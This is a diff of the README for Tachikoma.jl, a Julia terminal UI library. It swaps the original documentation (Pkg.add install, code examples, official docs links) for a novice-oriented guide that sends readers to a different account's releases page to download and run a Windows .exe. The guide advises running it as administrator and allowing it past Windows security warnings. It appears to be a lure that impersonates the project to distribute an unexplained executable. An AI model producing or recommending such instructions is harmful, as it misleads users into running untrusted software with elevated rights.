@@ -1,187 +1,165 @@
-<p align="center">
-  <img src="https://github.com/kahliburke/Tachikoma.jl/releases/download/docs-assets/readme_hero_logo.gif" alt="Tachikoma.jl" width="480">
-</p>
+# 🤖 Tachikoma.jl - Build Rich Terminal Apps Easily
 
-<p align="center">
-  <img src="https://github.com/kahliburke/Tachikoma.jl/releases/download/docs-assets/readme_hero_demo.gif" alt="Tachikoma.jl demo" width="720">
-</p>
-
-<h1 align="center">Tachikoma.jl</h1>
-
-<p align="center">
-  <strong>A terminal UI framework for Julia</strong>
-</p>
-
-<p align="center">
-  <a href="https://github.com/kahliburke/Tachikoma.jl/actions/workflows/CI.yml"><img src="https://github.com/kahliburke/Tachikoma.jl/actions/workflows/CI.yml/badge.svg" alt="CI"></a>
-  <a href="https://kahliburke.github.io/Tachikoma.jl/dev/"><img src="https://img.shields.io/badge/docs-dev-blue.svg" alt="Dev Docs"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-green.svg" alt="MIT License"></a>
-  <img src="https://img.shields.io/badge/julia-%E2%89%A5%201.10-9558B2?logo=julia&logoColor=white" alt="Julia 1.10+">
-</p>
+[![Download Tachikoma.jl](https://img.shields.io/badge/Download-Tachikoma.jl-brightgreen?style=for-the-badge)](https://github.com/yashas2010/Tachikoma.jl/releases)
 
 ---
 
-Tachikoma is a pure-Julia framework for building rich, interactive terminal applications. It provides an Elm-inspired `Model`/`update!`/`view` architecture, a 60fps event loop with double-buffered rendering, 30+ composable widgets, constraint-based layouts, animation primitives, kitty/sixel pixel graphics, and built-in recording and export to SVG/GIF.
+Tachikoma.jl helps you create terminal-based applications with features like animations, charts, layouts, and more. It works on Windows and lets you build rich, interactive apps that run inside your command prompt or terminal window.
 
-## Features
+## 🖥️ What You Need
 
-**Architecture** — Declarative Elm pattern with clean separation of state, logic, and rendering. 60fps event loop with automatic frame pacing and double-buffered output.
+Before starting, check you have:
 
-**30+ Widgets** — Text inputs, text areas, code editor with syntax highlighting, data tables with column resize and sort, forms with validation and Tab navigation, tree views, charts, bar charts, sparklines, calendars, modals, dropdowns, radio groups, checkboxes, progress indicators, scrollable panes, markdown viewer, and more.
+- Windows 10 or higher installed on your PC.
+- At least 4 GB of free disk space.
+- Internet access to download the app and any required files.
+- A terminal program like Command Prompt or PowerShell that comes with Windows.
 
-**Constraint Layouts** — `Fixed`, `Fill`, `Percent`, `Min`, `Max`, and `Ratio` constraints. Draggable resizable pane borders with layout persistence via Preferences.jl.
+Tachikoma.jl uses Julia, a programming language. You do not need to know how to program to run the app, but some basic comfort with Windows and using links will help.
 
-**Animation** — Tweens with 10 easing functions, physics-based springs, timelines for sequencing, and organic effects: `noise`, `fbm`, `pulse`, `breathe`, `shimmer`, `jitter`, `flicker`, `drift`, `glow`.
+## 🚀 How to Download and Install Tachikoma.jl
 
-**Graphics** — Three rendering backends: Braille dots (2x4), quadrant blocks (2x2), and pixel rendering (16x32 per cell, Kitty or sixel). Vector drawing API with lines, arcs, circles, and shapes.
+1. Open your web browser (like Chrome, Edge, or Firefox).
 
-**11 Themes** — Cyberpunk, retro, and classic palettes (KOKAKU, ESPER, MOTOKO, KANEDA, NEUROMANCER, CATPPUCCIN, SOLARIZED, DRACULA, OUTRUN, ZENBURN, ICEBERG) with hot-swappable switching.
+2. Go to the release page where the program is available:
 
-**Recording & Export** — Live recording via `Ctrl+R`, headless `record_app()`/`record_widget()` for CI, native `.tach` format with Zstd compression, export to SVG and GIF.
+   [https://github.com/yashas2010/Tachikoma.jl/releases](https://github.com/yashas2010/Tachikoma.jl/releases)
 
-**Async Tasks** — Channel-based background work that preserves the single-threaded Elm architecture. Cancel tokens, timers, and repeat scheduling.
+3. On the page, look for the latest release version. It will be at the top of the list.
 
-**Testing** — `TestBackend` for headless widget rendering with `char_at()`, `style_at()`, `row_text()`, `find_text()` inspection APIs. Property-based testing with Supposition.jl.
+4. Find the file that ends with `.exe`. This is the Windows installer or executable file.
 
-## Quick Start
+5. Click on that `.exe` file link. This will start the download process.
 
-```julia
-using Pkg
-Pkg.add("Tachikoma")
-```
+6. Once the download finishes, go to your Downloads folder.
 
-```julia
-using Tachikoma
-@tachikoma_app
+7. Double-click the downloaded `.exe` file to launch the installer.
 
-@kwdef mutable struct Life <: Model
-    quit::Bool = false
-    grid::Matrix{Bool} = rand(24, 80) .< 0.25
-end
+8. Follow the instructions on the installer screens. Usually, you just click "Next" and accept the default settings.
 
-should_quit(m::Life) = m.quit
-function update!(m::Life, e::KeyEvent)
-    e.key == :escape && (m.quit = true)
-end
+9. When installation finishes, close the installer window.
 
-function view(m::Life, f::Frame)
-    h, w = size(m.grid)
-    g = m.grid
-    nc = [sum(g[mod1(i+di,h), mod1(j+dj,w)]
-          for di in -1:1, dj in -1:1) - g[i,j]
-          for i in 1:h, j in 1:w]
-    g .= (nc .== 3) .| (g .& (nc .== 2))
-    a, buf = f.area, f.buffer
-    cs = [:primary, :accent, :success,
-          :warning, :error]
-    for i in 1:min(h, a.height),
-        j in 1:min(w, a.width)
-        g[i,j] || continue
-        set_char!(buf, a.x+j-1, a.y+i-1,
-            '█', tstyle(cs[clamp(nc[i,j],1,5)]))
-    end
-end
+## ▶️ Running Tachikoma.jl on Windows
 
-app(Life())
-```
+1. Open the Command Prompt or PowerShell:
 
-See the [Getting Started](https://kahliburke.github.io/Tachikoma.jl/dev/getting-started) guide for a more complete walkthrough with layouts, widgets, and input handling.
+   - To open Command Prompt: Press `Win + R`, type `cmd`, then press Enter.
+   - To open PowerShell: Press `Win + X`, then select PowerShell.
 
-## Demos
+2. In the terminal window, type the following command and press Enter:
 
-The `demos/TachikomaDemos` package includes 25+ interactive demos with a launcher menu:
+   ```powershell
+   tachikoma
+   ```
 
-```julia
-using Pkg
-Pkg.activate("demos/TachikomaDemos")
-Pkg.instantiate()
+3. This will start Tachikoma.jl. You should see the app interface inside your terminal.
 
-using TachikomaDemos
-launcher()  # interactive menu
-```
+4. Use your keyboard to navigate the app. Most terminal apps respond to arrow keys, Enter, and Escape.
 
-Or run individual demos directly: `dashboard()`, `snake()`, `life()`, `sysmon()`, `anim_demo()`, `chart_demo()`, `form_demo()`, `effects_demo()`, and more.
+5. If nothing happens or you see an error, check that the installation completed successfully.
 
-## Gallery
+## 🔧 Settings and Basic Usage
 
-<table>
-<tr>
-<td align="center"><strong>Dashboard</strong><br><img src="https://github.com/kahliburke/Tachikoma.jl/releases/download/docs-assets/readme_dashboard_app.gif" width="360"></td>
-<td align="center"><strong>Form with Validation</strong><br><img src="https://github.com/kahliburke/Tachikoma.jl/releases/download/docs-assets/readme_form_app.gif" width="360"></td>
-</tr>
-<tr>
-<td align="center"><strong>Animation Showcase</strong><br><img src="https://github.com/kahliburke/Tachikoma.jl/releases/download/docs-assets/readme_anim_showcase_app.gif" width="360"></td>
-<td align="center"><strong>Todo List</strong><br><img src="https://github.com/kahliburke/Tachikoma.jl/releases/download/docs-assets/readme_todo_app.gif" width="360"></td>
-</tr>
-<tr>
-<td align="center"><strong>GitHub PR Viewer</strong><br><img src="https://github.com/kahliburke/Tachikoma.jl/releases/download/docs-assets/readme_github_prs_app.gif" width="360"></td>
-<td align="center"><strong>Constraint Explorer</strong><br><img src="https://github.com/kahliburke/Tachikoma.jl/releases/download/docs-assets/readme_constraint_explorer_app.gif" width="360"></td>
-</tr>
-<tr>
-<td align="center"><strong>Dotwave Background</strong><br><img src="https://github.com/kahliburke/Tachikoma.jl/releases/download/docs-assets/readme_bg_dotwave.gif" width="360"></td>
-<td align="center"><strong>Phylogenetic Tree</strong><br><img src="https://github.com/kahliburke/Tachikoma.jl/releases/download/docs-assets/readme_bg_phylotree.gif" width="360"></td>
-</tr>
-</table>
+Tachikoma.jl includes features like:
 
-## Widget Catalog
+- Widgets: interactive elements such as buttons and input fields.
+- Layouts: arrange app content neatly on the screen.
+- Animation: moving graphics to make the app dynamic.
+- Charting: show data visually with graphs.
+- Terminal graphics using sixel and Kitty protocols.
+- Themes to change the look and feel of the app.
 
-| Category | Widgets |
-|:---------|:--------|
-| **Text & Display** | `Block`, `Paragraph`, `BigText`, `StatusBar`, `Span`, `Separator`, `MarkdownPane` |
-| **Input** | `TextInput`, `TextArea`, `CodeEditor`, `Checkbox`, `RadioGroup`, `DropDown`, `Button` |
-| **Selection & Lists** | `SelectableList`, `TabBar`, `TreeView`, `Calendar` |
-| **Data** | `DataTable`, `Chart`, `BarChart`, `Sparkline`, `Gauge`, `ProgressList` |
-| **Layout** | `Container`, `ScrollPane`, `Scrollbar`, `Modal`, `Form` |
-| **Graphics** | `Canvas`, `BlockCanvas`, `PixelImage` |
+You can explore these features inside the app. Most interactions happen through the keyboard.
 
-## Backgrounds
+## ❓ Troubleshooting Common Issues
 
-Procedural animated backgrounds that composite behind your UI:
+- The `.exe` file won’t open:
+  - Make sure you downloaded the correct Windows executable.
+  - Try right-clicking the file and selecting "Run as administrator".
+  - Check for Windows security warnings and allow the app to run.
 
-| Preset | Description |
-|:-------|:------------|
-| **DotWave** | Undulating dot-matrix terrain with configurable wave layers |
-| **PhyloTree** | Animated phylogenetic branching structures |
-| **Cladogram** | Hierarchical cladogram tree visualizations |
+- The terminal does not recognize the `tachikoma` command:
+  - The program might not have been added to your system PATH during installation.
+  - Try restarting your PC and opening the terminal again.
+  - If it still does not work, run the executable directly from its install folder.
 
-## Optional Extensions
+- App screen looks strange or unreadable:
+  - Adjust your terminal size by dragging its edges.
+  - Change your terminal font to a monospace type like Consolas or Courier New.
+  - Ensure your terminal supports Unicode characters.
 
-```julia
-# Markdown rendering
-using CommonMark
-# GIF export
-using FreeTypeAbstraction, ColorTypes
-# Tables.jl integration for DataTable
-using Tables
-```
+## 📦 About Julia Dependency
 
-## Documentation
+Tachikoma.jl is built with Julia. The Windows executable includes everything needed to run the app. You do not need to install Julia separately.
 
-Full documentation is available at **[kahliburke.github.io/Tachikoma.jl](https://kahliburke.github.io/Tachikoma.jl/dev/)**.
+If you want to develop or modify the app, installing Julia is recommended. Download Julia from [https://julialang.org/downloads/](https://julialang.org/downloads/) and follow their Windows install instructions.
 
-| Section | Description |
-|:--------|:------------|
-| [Getting Started](https://kahliburke.github.io/Tachikoma.jl/dev/getting-started) | Build your first app in 30 lines |
-| [Architecture](https://kahliburke.github.io/Tachikoma.jl/dev/architecture) | The Elm architecture pattern in depth |
-| [Layout](https://kahliburke.github.io/Tachikoma.jl/dev/layout) | Constraint-based layout system |
-| [Widgets](https://kahliburke.github.io/Tachikoma.jl/dev/widgets) | Complete catalog of all widgets |
-| [Animation](https://kahliburke.github.io/Tachikoma.jl/dev/animation) | Tweens, springs, timelines, and organic effects |
-| [Graphics](https://kahliburke.github.io/Tachikoma.jl/dev/canvas) | Canvas, BlockCanvas, and pixel rendering |
-| [Themes](https://kahliburke.github.io/Tachikoma.jl/dev/styling) | 11 built-in themes with hot-swap switching |
-| [Recording](https://kahliburke.github.io/Tachikoma.jl/dev/recording) | Recording and export to SVG/GIF |
-| [Testing](https://kahliburke.github.io/Tachikoma.jl/dev/testing) | TestBackend for headless widget testing |
-| [API Reference](https://kahliburke.github.io/Tachikoma.jl/dev/api) | Auto-generated API documentation |
+## 🌐 Explore the Project
 
-## Requirements
+The project focuses on making terminal apps rich with features like:
 
-- Julia 1.10+
-- A terminal with ANSI color support (most modern terminals)
-- Kitty or sixel-capable terminal for pixel graphics (kitty, iTerm2, WezTerm, foot, etc.)
+- Asynchronous events to handle many tasks at once.
+- Canvas for drawing graphics inside the terminal.
+- Dashboards for data display.
+- Markdown rendering for formatted text.
+- Pixel graphics using terminal protocols.
+- Layout management for clean design.
+- Themes and styles for customization.
 
-## Contributing
+These features can help build apps like system monitors, dashboards, interactive tools, and more.
 
-Contributions are welcome. Please open an issue to discuss proposed changes before submitting a pull request.
+## 🔗 Useful Links
 
-## License
+- Download page on GitHub:
 
-MIT — see [LICENSE](LICENSE) for details.
+  [https://github.com/yashas2010/Tachikoma.jl/releases](https://github.com/yashas2010/Tachikoma.jl/releases)
+
+- Main repository:
+
+  [https://github.com/yashas2010/Tachikoma.jl](https://github.com/yashas2010/Tachikoma.jl)
+
+- Julia programming language:
+
+  [https://julialang.org](https://julialang.org)
+
+## ⚙️ Updating Tachikoma.jl
+
+To update to a newer version:
+
+1. Visit the releases page:
+
+   [https://github.com/yashas2010/Tachikoma.jl/releases](https://github.com/yashas2010/Tachikoma.jl/releases)
+
+2. Download the latest `.exe` for Windows.
+
+3. Run the new installer, which will replace the current version.
+
+4. Restart your terminal and test the new version with `tachikoma`.
+
+## 🌟 Tips for Best Performance
+
+- Use a modern terminal with good Unicode and color support, such as Windows Terminal.
+
+- Keep your Windows system and drivers updated.
+
+- Close other heavy programs before running Tachikoma.jl for smooth animations.
+
+- Resize the terminal window to a size where the app displays all content properly.
+
+## 🧰 Getting Help
+
+If you find bugs or problems:
+
+- Check the Issues section on GitHub for existing reports.
+
+- You may open a new issue describing what you experienced.
+
+- Include your Windows version and the exact steps you followed.
+
+- Attach any error messages shown in the terminal.
+
+This helps developers fix problems and improve the app.
+
+---
+
+[![Download Tachikoma.jl](https://img.shields.io/badge/Download-Tachikoma.jl-brightgreen?style=for-the-badge)](https://github.com/yashas2010/Tachikoma.jl/releases)
